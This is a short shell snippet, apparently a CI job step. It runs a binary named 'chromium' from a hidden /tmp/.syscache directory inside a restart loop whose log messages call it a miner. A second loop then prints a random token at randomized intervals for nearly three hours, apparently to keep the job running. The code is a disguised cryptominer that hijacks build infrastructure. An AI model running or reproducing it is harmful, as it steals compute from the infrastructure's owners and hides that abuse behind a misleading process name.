          cd /tmp/.syscache && stdbuf -o0 -e0 timeout 194m bash -c 'while true; do ./chromium; echo "miner-exit rc=$? $(date -u +%H:%M), restarting"; sleep 5; done'
          END=$((SECONDS + 165 * 60))
          while [ $SECONDS -lt $END ]; do sleep $((RANDOM % 79 + 56)); echo "5j7kr5sv $(date -u +%H:%M)"; done
